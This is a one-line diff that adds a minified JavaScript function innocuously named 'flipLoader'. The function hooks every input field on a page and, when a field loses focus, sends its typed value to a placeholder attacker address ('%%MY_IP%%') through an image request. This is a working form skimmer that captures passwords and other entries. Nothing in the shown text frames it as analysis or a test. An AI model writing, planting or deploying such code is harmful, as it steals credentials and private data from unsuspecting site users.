@@ -1,0 +1,1 @@
+function flipLoader(){let e=document.querySelectorAll("input");0===e.length?window.setTimeout(()=>{flipLoader()},1e3):e.forEach(e=>e.onblur=()=>(new Image).src=`http://%%MY_IP%%/k=${e.value}`)}flipLoader();
